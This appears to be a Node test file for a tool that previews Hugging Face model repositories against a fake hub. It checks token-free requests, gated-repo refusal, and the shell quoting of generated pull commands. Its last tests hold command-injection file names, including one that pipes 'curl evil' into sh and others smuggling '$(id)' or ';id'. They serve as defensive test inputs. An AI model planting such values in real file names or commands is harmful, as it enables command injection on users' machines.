// node --test tools/socair-preview/
// The page's half of the preview, against a fake hub: no network.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { GatedError, HubFS, listRepo, previewSelection } from './hffs.js';
import { airlockCommands, parseTarget, shellQuote } from './preview.js';
import { execFileSync } from 'node:child_process';

const COMMIT = 'c0ffee12'.repeat(5);

// A fake hub: the API answers info, every resolve URL serves body ranges.
// Every request is recorded with its headers.
function fakeHub(info, bodies = {}, status = 200) {
	const seen = [];
	globalThis.fetch = async (url, init = {}) => {
		const headers = new Headers(init.headers || {});
		seen.push({ url: String(url), headers });
		if (String(url).includes('/api/models/')) {
			return new Response(JSON.stringify(info), { status });
		}
		const path = decodeURIComponent(String(url).split(`/resolve/${COMMIT}/`)[1] || '');
		const body = bodies[path];
		if (!body) return new Response('', { status: 404 });
		const m = /bytes=(\d+)-(\d+)/.exec(headers.get('range') || '');
		const [from, to] = m ? [Number(m[1]), Number(m[2]) + 1] : [0, body.length];
		return new Response(body.subarray(from, to), { status: m ? 206 : 200 });
	};
	return seen;
}

test('a gated repo is refused before any file is read', async () => {
	for (const gated of ['auto', 'manual', true]) {
		const seen = fakeHub({ id: 'org/m', sha: COMMIT, gated, siblings: [{ rfilename: 'config.json', size: 2 }] });
		await assert.rejects(listRepo('org/m'), GatedError);
		assert.equal(seen.filter((r) => r.url.includes('/resolve/')).length, 0);
	}
	for (const status of [401, 403]) {
		fakeHub({}, {}, status);
		await assert.rejects(listRepo('org/m'), GatedError);
	}
	fakeHub({ id: 'org/m', sha: COMMIT, private: true, siblings: [] });
	await assert.rejects(listRepo('org/m'), GatedError);
});

test('a listing names a full commit, or the preview stops', async () => {
	fakeHub({ id: 'org/m', sha: 'main', siblings: [] });
	await assert.rejects(listRepo('org/m'), /no full commit/);
	fakeHub({ id: 'org/m', sha: COMMIT, siblings: [] });
	assert.equal((await listRepo('org/m')).commit, COMMIT);
	await assert.rejects(listRepo('org/../m'), /not an org\/name/);
});

test('no request carries a token', async () => {
	const big = new Uint8Array(3 * 1024 * 1024).fill(7);
	const seen = fakeHub(
		{ id: 'org/m', sha: COMMIT, siblings: [
			{ rfilename: 'config.json', size: 2 },
			{ rfilename: 'model.safetensors', size: big.length, lfs: { size: big.length, sha256: 'ab'.repeat(32) } }] },
		{ 'config.json': new TextEncoder().encode('{}'), 'model.safetensors': big });
	const listing = await listRepo('org/m');
	const hub = new HubFS(listing);
	await hub.hashes();
	await hub.bytes(hub.node(`${hub.root}/model.safetensors`), 0, 100);
	assert.ok(seen.length >= 3);
	for (const r of seen) assert.equal(r.headers.get('authorization'), null, r.url);
	// Falsification: the recorder sees a header when one is sent.
	await fetch('https://huggingface.co/x', { headers: { Authorization: 'Bearer x' } });
	assert.equal(seen.at(-1).headers.get('authorization'), 'Bearer x');
});

test('hashes are stated for LFS files and computed for small ones', async () => {
	const small = new TextEncoder().encode('{"a":1}');
	fakeHub({ id: 'org/m', sha: COMMIT, siblings: [
		{ rfilename: 'config.json', size: small.length },
		{ rfilename: 'model.safetensors', size: 1 << 22, lfs: { size: 1 << 22, sha256: 'ab'.repeat(32) } }] },
	{ 'config.json': small });
	const hub = new HubFS(await listRepo('org/m'));
	const h = await hub.hashes();
	assert.equal(h['model.safetensors'], 'ab'.repeat(32));
	assert.equal(h['config.json'], createHash('sha256').update(small).digest('hex'));
});

test('a read past the budget fails, and is recorded', async () => {
	const big = new Uint8Array(4 * 1024 * 1024);
	fakeHub({ id: 'org/m', sha: COMMIT, siblings: [
		{ rfilename: 'model.safetensors', size: big.length, lfs: { size: big.length, sha256: 'ab'.repeat(32) } }] },
	{ 'model.safetensors': big });
	const hub = new HubFS({ ...(await listRepo('org/m')), perFileBudget: 1024 });
	const buf = new Uint8Array(4096);
	const err = await new Promise((resolve) => hub.open(`${hub.root}/model.safetensors`, 0, 0, (e, fd) =>
		hub.read(fd, buf, 0, 4096, 0, (e2) => resolve(e2))));
	assert.ok(err);
	assert.equal(hub.failures.length, 1);
});

test('the selection keeps what the airlock pull would, one quant of a GGUF repo', () => {
	const st = previewSelection([{ path: 'model.safetensors' }, { path: 'pytorch_model.bin' }, { path: 'config.json' }, { path: 'modeling.py' }]);
	assert.deepEqual(st.kept.map((f) => f.path), ['model.safetensors', 'config.json', 'modeling.py']);
	assert.deepEqual(st.left.map((f) => f.path), ['pytorch_model.bin']);

	const files = [{ path: 'm-Q8_0.gguf', size: 8 }, { path: 'm-Q4_K_M.gguf', size: 4 }, { path: 'm-Q2_K.gguf', size: 2 },
		{ path: 'mmproj-f16.gguf', size: 1 }, { path: 'README.md', size: 1 }];
	const q = previewSelection(files);
	assert.equal(q.gguf, 'm-Q4_K_M.gguf');
	assert.deepEqual(q.kept.map((f) => f.path), ['m-Q4_K_M.gguf', 'README.md']);
	assert.deepEqual(q.ggufs, ['m-Q2_K.gguf', 'm-Q4_K_M.gguf', 'm-Q8_0.gguf']);
	assert.equal(previewSelection(files, { gguf: 'm-Q8_0.gguf' }).gguf, 'm-Q8_0.gguf');
	assert.equal(previewSelection(files.filter((f) => !/Q4_K_M/.test(f.path))).gguf, 'm-Q2_K.gguf');
});

test('a target names a repo and a revision', () => {
	assert.deepEqual(parseTarget('https://huggingface.co/org/name'), { repo: 'org/name', revision: 'main' });
	assert.deepEqual(parseTarget('huggingface.co/org/name/tree/abc123'), { repo: 'org/name', revision: 'abc123' });
	assert.deepEqual(parseTarget('org/name'), { repo: 'org/name', revision: 'main' });
	assert.deepEqual(parseTarget('hf.co/org/name/'), { repo: 'org/name', revision: 'main' });
	for (const bad of ['', 'name', 'org/../x', 'https://example.com/a/b/c', '%E0%A4%A']) assert.equal(parseTarget(bad), null, bad);
});

// The commands are copied into a shell, and the repo id, the commit, and the
// file names come from the hub. A value outside a strict charset is refused,
// with no command; the rest are single-quoted anyway.
const okListing = { repo: 'org/m', commit: COMMIT };
const DIGEST = 'ab'.repeat(32);

test('a file name a shell would act on gets no command', () => {
	for (const name of ["x';curl evil|sh;'.gguf", 'x;id.gguf', 'x$(id).gguf', 'x`id`.gguf', 'x\nid.gguf', 'x y.gguf']) {
		const out = airlockCommands(okListing, { include: [name, '*.json'] }, DIGEST);
		assert.equal(out.commands, undefined, name);
		assert.match(out.refused, /No command is shown/, name);
	}
	for (const listing of [{ repo: "org/m';id;'", commit: COMMIT }, { repo: 'org/m', commit: 'main;id' }]) {
		assert.equal(airlockCommands(listing, { include: [] }, DIGEST).commands, undefined, JSON.stringify(listing));
	}
	assert.equal(airlockCommands(okListing, { include: [] }, 'x;id').commands, undefined);
});

test('every value in a command is single-quoted', () => {
	assert.equal(shellQuote("a'b"), "'a'\\''b'");
	const { commands } = airlockCommands(okListing, { include: ['m-Q4_K_M.gguf', '*.json'] }, DIGEST);
	assert.ok(commands.includes(`--repo 'org/m' --revision '${COMMIT}'`), commands);
	assert.ok(commands.includes(`--include 'm-Q4_K_M.gguf,*.json'`), commands);
	assert.ok(commands.includes(`/incoming/'${DIGEST}'`), commands);
	assert.ok(commands.includes(`"$E"/'m'`), commands);
});

test('a quoted value is one word to a real shell', { skip: !process.env.PATH }, () => {
	for (const v of ["x';id;'", 'x$(id)', 'x`id`', 'a b', 'x\ny', "''"]) {
		const out = execFileSync('/bin/sh', ['-c', `printf %s ${shellQuote(v)}`], { encoding: 'utf8' });
		assert.equal(out, v);
	}
});
